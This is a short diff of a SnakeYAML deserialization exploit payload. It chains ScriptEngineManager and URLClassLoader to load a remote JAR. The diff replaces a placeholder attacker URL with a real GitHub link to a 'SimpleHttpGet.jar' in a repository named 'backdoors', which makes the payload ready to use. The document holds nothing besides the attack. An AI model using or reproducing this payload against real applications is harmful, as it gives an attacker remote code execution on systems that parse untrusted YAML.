@@ -1,5 +1,5 @@
 !!javax.script.ScriptEngineManager [
   !!java.net.URLClassLoader [[
-    !!java.net.URL ["http://attacker-website.com/payload.jar"]
+    !!java.net.URL ["https://github.com/elefantesagradodeluzinfinita/backdoors/raw/main/SimpleHttpGet.jar"]
   ]]
 ]
